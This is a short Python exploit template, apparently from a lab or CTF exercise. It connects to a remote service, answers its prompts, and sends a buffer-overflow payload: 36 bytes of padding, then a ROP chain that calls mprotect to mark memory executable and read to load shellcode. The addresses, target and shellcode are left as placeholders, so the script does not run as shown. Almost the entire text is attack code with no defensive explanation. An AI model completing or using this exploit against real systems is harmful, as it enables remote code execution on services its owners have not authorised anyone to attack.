#!/usr/bin/python

# import modules
import socket
import struct
import time
import sys

def p(x):
    return struct.pack('<L',x)

Yes = "y\n"
Payload_Sent = "Payload Sent"

#function addresses

# place holder values have been changed to "0", they need to be changed
# before you run this code
memprotect = 0x000000
read = 0x0000000
popret = 0x0000000

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((<target IP>, <target port>))

payload = 'A'*36 # Original fuzzing buffer.

payload += p(memprotect)
payload += p(popret)

shellcode = "<insert shell code>"
#3 lines mprotect function takes
payload += p(0x0000000) #area of memory starting from
payload += p(0x00000) #length
payload += p(0x0)#permission RWX

payload += p(read)
payload += p(popret)

#read arguments
payload += p(0x0)#fd -- not a place holder and 0 means stdin
payload += p(0x0000000)#read from here; set from mprotect
payload += p(0x000)# size

payload += p(0x000000)

print(s.recv(1040))
print(s.send(Yes))
print(s.recv(1040))
time.sleep(.5)
print(s.recv(1040))
print(s.send(Yes))
print(s.recv(1040))
time.sleep(.5)
print(s.recv(1040))
time.sleep(.5)
raw_input("YO YOU CAN CASH ME OUTSIDE!!")
print(s.recv(1040))
print(s.send(payload + "\n"))
time.sleep(.5)
s.send(input())
print Payload_Sent
print(s.recv(1040))
print(s.recv(1040))
